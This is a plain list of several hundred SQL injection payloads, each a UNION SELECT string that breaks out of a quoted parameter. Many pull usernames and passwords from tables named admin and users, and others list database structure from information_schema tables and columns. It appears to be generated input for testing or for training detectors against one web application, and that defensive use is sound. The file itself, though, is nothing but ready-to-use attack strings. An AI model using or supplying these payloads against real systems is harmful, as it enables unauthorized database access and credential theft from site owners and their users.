1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT price ,name ,NULL ,type FROM products WHERE type <>'
1' UNION SELECT NULL ,NULL ,username ,username FROM admin WHERE password ='1
1' UNION SELECT id ,username ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT password ,id ,NULL ,id FROM users WHERE id <>'
1' UNION SELECT id ,id ,id ,name FROM types WHERE description ='1
1' UNION SELECT price ,price ,price ,id FROM products WHERE type <>'
1' UNION SELECT id ,password ,id ,id FROM admin WHERE password <>'
1' UNION SELECT description ,NULL ,id ,NULL FROM types WHERE name <>'
1' UNION SELECT id ,NULL ,password ,password FROM users WHERE password <>'
1' UNION SELECT username ,username ,NULL ,id FROM users WHERE password <>'
1' UNION SELECT id ,NULL ,id ,password FROM admin WHERE id <>'
1' UNION SELECT name ,NULL ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT ROW_FORMAT ,TABLE_ROWS ,INDEX_LENGTH ,TABLE_SCHEMA FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT comment ,name ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,id ,username ,id FROM admin WHERE id <>'
1' UNION SELECT name ,NULL ,comment ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,description ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,password ,password ,username FROM users WHERE username ='1
1' UNION SELECT GENERATION_EXPRESSION ,TABLE_CATALOG ,TABLE_NAME ,COLUMN_NAME FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT id ,description ,id ,description FROM types WHERE id ='1
1' UNION SELECT ENGINE ,CHECK_TIME ,ENGINE ,ENGINE FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT comment ,comment ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT PRIVILEGES ,NUMERIC_PRECISION ,TABLE_SCHEMA ,SRS_ID FROM information_schema.columns WHERE ORDINAL_POSITION <>'
1' UNION SELECT DATA_FREE ,UPDATE_TIME ,TABLE_NAME ,TABLE_COLLATION FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT DATETIME_PRECISION ,DATETIME_PRECISION ,DATA_TYPE ,IS_NULLABLE FROM information_schema.columns WHERE PRIVILEGES <>'
1' UNION SELECT NUMERIC_SCALE ,NULL ,PRIVILEGES ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE GENERATION_EXPRESSION ='1
1' UNION SELECT name ,description ,description ,id FROM types WHERE id <>'
1' UNION SELECT NULL ,username ,id ,id FROM users WHERE id ='1
1' UNION SELECT name ,comment ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT name ,id ,name ,description FROM types WHERE id <>'
1' UNION SELECT NUMERIC_PRECISION ,TABLE_NAME ,SRS_ID ,TABLE_SCHEMA FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT TABLE_CATALOG ,TABLE_SCHEMA ,DATA_TYPE ,ORDINAL_POSITION FROM information_schema.columns WHERE EXTRA <>'
1' UNION SELECT id ,id ,description ,name FROM types WHERE id ='1
1' UNION SELECT NULL ,NULL ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT name ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_NAME ,ENGINE ,VERSION ,TABLE_ROWS FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT NULL ,NULL ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT COLUMN_DEFAULT ,COLLATION_NAME ,DATETIME_PRECISION ,COLUMN_NAME FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT name ,name ,id ,description FROM types WHERE id ='1
1' UNION SELECT ENGINE ,AVG_ROW_LENGTH ,ROW_FORMAT ,TABLE_COLLATION FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT NULL ,id ,NULL ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,type ,price ,NULL FROM products WHERE name <>'
1' UNION SELECT DATA_TYPE ,NULL ,NUMERIC_PRECISION ,COLUMN_TYPE FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT TABLE_SCHEMA ,COLUMN_DEFAULT ,TABLE_NAME ,EXTRA FROM information_schema.columns WHERE COLUMN_NAME <>'
1' UNION SELECT username ,id ,username ,id FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,COLUMN_COMMENT ,COLUMN_DEFAULT ,NUMERIC_SCALE FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT UPDATE_TIME ,ENGINE ,TABLE_SCHEMA ,AUTO_INCREMENT FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT TABLE_SCHEMA ,AVG_ROW_LENGTH ,TABLE_COMMENT ,TABLE_COLLATION FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT ORDINAL_POSITION ,CHARACTER_MAXIMUM_LENGTH ,NUMERIC_SCALE ,NULL FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT NUMERIC_SCALE ,NUMERIC_SCALE ,EXTRA ,NULL FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
1' UNION SELECT type ,type ,type ,name FROM products WHERE type <>'
1' UNION SELECT comment ,name ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,id ,NULL ,id FROM products WHERE id ='1
1' UNION SELECT id ,password ,password ,password FROM users WHERE username ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT COLUMN_TYPE ,ORDINAL_POSITION ,EXTRA ,PRIVILEGES FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
1' UNION SELECT id ,description ,id ,name FROM types WHERE id ='1
1' UNION SELECT GENERATION_EXPRESSION ,TABLE_CATALOG ,SRS_ID ,IS_NULLABLE FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT VERSION ,INDEX_LENGTH ,CHECK_TIME ,TABLE_COMMENT FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT DATETIME_PRECISION ,DATETIME_PRECISION ,COLUMN_DEFAULT ,TABLE_CATALOG FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT comment ,name ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT name ,name ,id ,name FROM types WHERE id ='1
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_ROWS ,TABLE_ROWS ,CHECKSUM ,AUTO_INCREMENT FROM information_schema.tables WHERE ENGINE ='1
1' UNION SELECT NULL ,password ,password ,username FROM users WHERE id ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT comment ,comment ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,username ,id ,NULL FROM users WHERE username ='1
1' UNION SELECT name ,id ,type ,id FROM products WHERE id ='1
1' UNION SELECT id ,id ,NULL ,id FROM users WHERE password <>'
1' UNION SELECT NULL ,type ,name ,name FROM products WHERE price <>'
1' UNION SELECT TABLE_CATALOG ,ROW_FORMAT ,MAX_DATA_LENGTH ,TABLE_ROWS FROM information_schema.tables WHERE DATA_LENGTH ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT id ,password ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT IS_NULLABLE ,TABLE_SCHEMA ,DATETIME_PRECISION ,COLUMN_COMMENT FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT NULL ,description ,NULL ,id FROM types WHERE id ='1
1' UNION SELECT comment ,name ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,description ,name ,id FROM types WHERE description ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT comment ,comment ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT TABLE_SCHEMA ,NUMERIC_PRECISION ,COLUMN_DEFAULT ,PRIVILEGES FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT NULL ,password ,id ,NULL FROM users WHERE id <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,id ,id FROM users WHERE id <>'
1' UNION SELECT COLLATION_NAME ,NUMERIC_SCALE ,CHARACTER_SET_NAME ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT ENGINE ,TABLE_NAME ,TABLE_CATALOG ,MAX_DATA_LENGTH FROM information_schema.tables WHERE INDEX_LENGTH <>'
1' UNION SELECT TABLE_CATALOG ,DATA_FREE ,CHECKSUM ,ROW_FORMAT FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT SRS_ID ,COLUMN_TYPE ,COLUMN_TYPE ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,id ,id ,id FROM types WHERE id <>'
1' UNION SELECT NULL ,NULL ,password ,NULL FROM admin WHERE password ='1
1' UNION SELECT type ,name ,NULL ,id FROM products WHERE name ='1
1' UNION SELECT password ,password ,NULL ,password FROM admin WHERE password ='1
1' UNION SELECT id ,name ,name ,id FROM types WHERE id <>'
1' UNION SELECT name ,id ,id ,id FROM products WHERE id ='1
1' UNION SELECT NULL ,CREATE_TIME ,TABLE_COLLATION ,NULL FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,id ,id ,NULL FROM users WHERE id <>'
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT MAX_DATA_LENGTH ,TABLE_TYPE ,TABLE_CATALOG ,DATA_FREE FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT name ,name ,id ,id FROM products WHERE name ='1
1' UNION SELECT password ,password ,NULL ,id FROM admin WHERE id ='1
1' UNION SELECT NULL ,id ,password ,id FROM admin WHERE id <>'
1' UNION SELECT COLUMN_TYPE ,CHARACTER_OCTET_LENGTH ,EXTRA ,COLUMN_NAME FROM information_schema.columns WHERE COLUMN_KEY <>'
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,password ,username ,username FROM users WHERE id ='1
1' UNION SELECT username ,id ,username ,password FROM users WHERE password ='1
1' UNION SELECT TABLE_COLLATION ,DATA_LENGTH ,TABLE_COMMENT ,MAX_DATA_LENGTH FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT CHECK_TIME ,TABLE_SCHEMA ,TABLE_ROWS ,ENGINE FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT MAX_DATA_LENGTH ,CHECKSUM ,ENGINE ,AVG_ROW_LENGTH FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,id ,NULL ,id FROM products WHERE id ='1
1' UNION SELECT id ,password ,username ,username FROM admin WHERE id ='1
1' UNION SELECT description ,name ,name ,id FROM types WHERE id <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,username ,NULL ,password FROM users WHERE password ='1
1' UNION SELECT id ,NULL ,description ,name FROM types WHERE id ='1
1' UNION SELECT id ,password ,NULL ,username FROM users WHERE password ='1
1' UNION SELECT name ,name ,NULL ,type FROM products WHERE type <>'
1' UNION SELECT NULL ,type ,type ,price FROM products WHERE type ='1
1' UNION SELECT COLUMN_TYPE ,ORDINAL_POSITION ,DATA_TYPE ,COLUMN_KEY FROM information_schema.columns WHERE NUMERIC_SCALE ='1
1' UNION SELECT name ,id ,name ,name FROM types WHERE description <>'
1' UNION SELECT password ,username ,NULL ,id FROM users WHERE password <>'
1' UNION SELECT type ,price ,type ,type FROM products WHERE price ='1
1' UNION SELECT COLUMN_DEFAULT ,COLUMN_NAME ,DATETIME_PRECISION ,IS_NULLABLE FROM information_schema.columns WHERE CHARACTER_SET_NAME ='1
1' UNION SELECT CREATE_OPTIONS ,TABLE_TYPE ,AUTO_INCREMENT ,TABLE_ROWS FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT name ,id ,NULL ,id FROM types WHERE name ='1
1' UNION SELECT id ,description ,id ,NULL FROM types WHERE name <>'
1' UNION SELECT NULL ,comment ,comment ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT CREATE_OPTIONS ,DATA_FREE ,CREATE_OPTIONS ,TABLE_COLLATION FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT TABLE_CATALOG ,INDEX_LENGTH ,AVG_ROW_LENGTH ,INDEX_LENGTH FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT NULL ,name ,description ,description FROM types WHERE id ='1
1' UNION SELECT TABLE_NAME ,TABLE_CATALOG ,CHARACTER_MAXIMUM_LENGTH ,GENERATION_EXPRESSION FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,type ,price FROM products WHERE type <>'
1' UNION SELECT id ,username ,password ,password FROM users WHERE password ='1
1' UNION SELECT id ,id ,price ,price FROM products WHERE name ='1
1' UNION SELECT NULL ,name ,description ,description FROM types WHERE name ='1
1' UNION SELECT CREATE_TIME ,AVG_ROW_LENGTH ,TABLE_SCHEMA ,MAX_DATA_LENGTH FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT NULL ,price ,NULL ,type FROM products WHERE name ='1
1' UNION SELECT name ,id ,NULL ,NULL FROM products WHERE price <>'
1' UNION SELECT CREATE_OPTIONS ,TABLE_ROWS ,TABLE_SCHEMA ,DATA_FREE FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT password ,username ,NULL ,id FROM users WHERE password ='1
1' UNION SELECT id ,NULL ,name ,id FROM products WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,description FROM types WHERE id <>'
1' UNION SELECT password ,id ,password ,username FROM admin WHERE id ='1
1' UNION SELECT password ,NULL ,password ,username FROM admin WHERE password ='1
1' UNION SELECT comment ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT comment ,comment ,comment ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT password ,password ,NULL ,id FROM admin WHERE username ='1
1' UNION SELECT id ,description ,description ,id FROM types WHERE id <>'
1' UNION SELECT TABLE_CATALOG ,NULL ,CREATE_OPTIONS ,VERSION FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT TABLE_CATALOG ,NUMERIC_PRECISION ,COLUMN_KEY ,NUMERIC_SCALE FROM information_schema.columns WHERE TABLE_CATALOG ='1
1' UNION SELECT NULL ,password ,NULL ,username FROM admin WHERE id <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,id ,id ,username FROM admin WHERE username <>'
1' UNION SELECT SRS_ID ,CHARACTER_MAXIMUM_LENGTH ,DATETIME_PRECISION ,COLUMN_TYPE FROM information_schema.columns WHERE DATETIME_PRECISION <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,id ,description FROM types WHERE description <>'
1' UNION SELECT comment ,comment ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,username ,password ,username FROM admin WHERE username ='1
1' UNION SELECT CHECK_TIME ,CHECK_TIME ,DATA_LENGTH ,TABLE_CATALOG FROM information_schema.tables WHERE TABLE_CATALOG <>'
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT comment ,NULL ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,id ,username FROM users WHERE password ='1
1' UNION SELECT username ,password ,username ,id FROM admin WHERE password ='1
1' UNION SELECT password ,id ,username ,username FROM users WHERE password <>'
1' UNION SELECT id ,NULL ,NULL ,username FROM users WHERE id <>'
1' UNION SELECT id ,username ,id ,NULL FROM users WHERE id <>'
1' UNION SELECT COLUMN_TYPE ,TABLE_SCHEMA ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE FROM information_schema.columns WHERE COLUMN_KEY ='1
1' UNION SELECT price ,id ,name ,id FROM products WHERE name <>'
1' UNION SELECT DATETIME_PRECISION ,EXTRA ,CHARACTER_MAXIMUM_LENGTH ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT description ,id ,name ,name FROM types WHERE id ='1
1' UNION SELECT username ,id ,id ,username FROM admin WHERE password <>'
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT AVG_ROW_LENGTH ,ROW_FORMAT ,TABLE_SCHEMA ,DATA_LENGTH FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT username ,NULL ,id ,NULL FROM admin WHERE password ='1
1' UNION SELECT id ,username ,NULL ,NULL FROM users WHERE password ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,id ,NULL ,description FROM types WHERE name ='1
1' UNION SELECT name ,name ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE password <>'
1' UNION SELECT username ,password ,username ,id FROM users WHERE password ='1
1' UNION SELECT NULL ,password ,username ,NULL FROM users WHERE id <>'
1' UNION SELECT password ,id ,username ,username FROM admin WHERE password <>'
1' UNION SELECT COLUMN_KEY ,CHARACTER_OCTET_LENGTH ,COLUMN_DEFAULT ,TABLE_CATALOG FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,type ,id FROM products WHERE name ='1
1' UNION SELECT MAX_DATA_LENGTH ,VERSION ,CREATE_TIME ,DATA_FREE FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT NULL ,id ,description ,description FROM types WHERE name ='1
1' UNION SELECT COLUMN_DEFAULT ,IS_NULLABLE ,CHARACTER_SET_NAME ,NUMERIC_SCALE FROM information_schema.columns WHERE COLUMN_DEFAULT ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT VERSION ,DATA_FREE ,TABLE_SCHEMA ,NULL FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT name ,comment ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT TABLE_COLLATION ,CHECK_TIME ,CREATE_OPTIONS ,CREATE_TIME FROM information_schema.tables WHERE ROW_FORMAT ='1
1' UNION SELECT id ,password ,password ,id FROM admin WHERE password <>'
1' UNION SELECT username ,id ,id ,username FROM users WHERE id <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,COLLATION_NAME ,ORDINAL_POSITION ,COLUMN_COMMENT FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,type ,id ,NULL FROM products WHERE price <>'
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT comment ,comment ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT TABLE_SCHEMA ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT id ,description ,NULL ,id FROM types WHERE id <>'
1' UNION SELECT password ,username ,username ,password FROM admin WHERE username ='1
1' UNION SELECT NUMERIC_SCALE ,NULL ,COLUMN_DEFAULT ,NUMERIC_PRECISION FROM information_schema.columns WHERE ORDINAL_POSITION <>'
1' UNION SELECT type ,name ,id ,id FROM products WHERE name ='1
1' UNION SELECT password ,id ,id ,password FROM admin WHERE username ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT comment ,name ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT DATETIME_PRECISION ,COLUMN_TYPE ,NULL ,NUMERIC_SCALE FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,id ,NULL ,NULL FROM products WHERE type ='1
1' UNION SELECT AVG_ROW_LENGTH ,TABLE_CATALOG ,TABLE_COMMENT ,VERSION FROM information_schema.tables WHERE CHECKSUM ='1
1' UNION SELECT description ,description ,NULL ,description FROM types WHERE name ='1
1' UNION SELECT NULL ,id ,password ,password FROM admin WHERE username <>'
1' UNION SELECT NULL ,description ,NULL ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_CATALOG ,CHARACTER_OCTET_LENGTH ,TABLE_NAME ,PRIVILEGES FROM information_schema.columns WHERE EXTRA <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT IS_NULLABLE ,CHARACTER_SET_NAME ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_DEFAULT FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT comment ,NULL ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT id ,id ,name ,name FROM products WHERE price ='1
1' UNION SELECT id ,description ,name ,description FROM types WHERE description <>'
1' UNION SELECT NULL ,price ,NULL ,NULL FROM products WHERE id <>'
1' UNION SELECT id ,password ,username ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT price ,NULL ,NULL ,price FROM products WHERE price <>'
1' UNION SELECT username ,NULL ,username ,NULL FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,name ,NULL FROM types WHERE description ='1
1' UNION SELECT NUMERIC_SCALE ,NUMERIC_PRECISION ,CHARACTER_OCTET_LENGTH ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT NULL ,comment ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,NULL ,description ,description FROM types WHERE name <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT username ,NULL ,username ,password FROM admin WHERE password <>'
1' UNION SELECT comment ,name ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT COLUMN_TYPE ,EXTRA ,GENERATION_EXPRESSION ,SRS_ID FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT name ,id ,name ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT price ,price ,type ,name FROM products WHERE name ='1
1' UNION SELECT CHECK_TIME ,AVG_ROW_LENGTH ,TABLE_CATALOG ,INDEX_LENGTH FROM information_schema.tables WHERE CREATE_OPTIONS ='1
1' UNION SELECT NULL ,description ,name ,id FROM types WHERE name ='1
1' UNION SELECT SRS_ID ,DATA_TYPE ,CHARACTER_OCTET_LENGTH ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE NUMERIC_SCALE ='1
1' UNION SELECT TABLE_CATALOG ,SRS_ID ,COLLATION_NAME ,CHARACTER_SET_NAME FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT id ,description ,description ,name FROM types WHERE description <>'
1' UNION SELECT name ,NULL ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,NULL ,password ,id FROM users WHERE password <>'
1' UNION SELECT name ,NULL ,NULL ,NULL FROM types WHERE name <>'
1' UNION SELECT NULL ,CHARACTER_OCTET_LENGTH ,CHARACTER_SET_NAME ,COLUMN_NAME FROM information_schema.columns WHERE PRIVILEGES <>'
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT comment ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,name ,id ,name FROM products WHERE id ='1
1' UNION SELECT COLUMN_TYPE ,DATA_TYPE ,ORDINAL_POSITION ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT username ,password ,password ,id FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,username ,id FROM users WHERE password ='1
1' UNION SELECT NULL ,description ,NULL ,description FROM types WHERE description <>'
1' UNION SELECT name ,name ,description ,name FROM types WHERE id <>'
1' UNION SELECT name ,NULL ,NULL ,price FROM products WHERE type <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT password ,username ,username ,NULL FROM users WHERE password ='1
1' UNION SELECT comment ,NULL ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT description ,name ,NULL ,id FROM types WHERE name ='1
1' UNION SELECT id ,price ,price ,type FROM products WHERE name ='1
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT id ,id ,name ,description FROM types WHERE name <>'
1' UNION SELECT id ,NULL ,name ,NULL FROM types WHERE name <>'
1' UNION SELECT name ,id ,description ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,password ,username ,username FROM users WHERE id ='1
1' UNION SELECT id ,password ,NULL ,username FROM admin WHERE password <>'
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_ROWS ,UPDATE_TIME ,ENGINE ,TABLE_COLLATION FROM information_schema.tables WHERE ROW_FORMAT ='1
1' UNION SELECT description ,description ,id ,NULL FROM types WHERE name <>'
1' UNION SELECT id ,id ,name ,name FROM types WHERE description ='1
1' UNION SELECT password ,password ,id ,id FROM admin WHERE password <>'
